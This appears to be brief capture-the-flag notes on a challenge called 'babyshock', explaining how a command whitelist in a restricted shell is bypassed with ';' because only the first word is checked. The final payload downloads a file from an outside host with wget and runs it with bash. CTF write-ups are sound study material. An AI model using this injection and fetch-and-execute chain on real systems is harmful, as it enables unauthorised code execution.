# babyshock

- A shell environment with only a whitelist of commands allowed.
- `;` wasn't blacklist, so could execute any command as only the command before the first whitespace was checked in the whitelist
- Final payload was something like:
```
id ; wget pb.hn
bash index.html
```
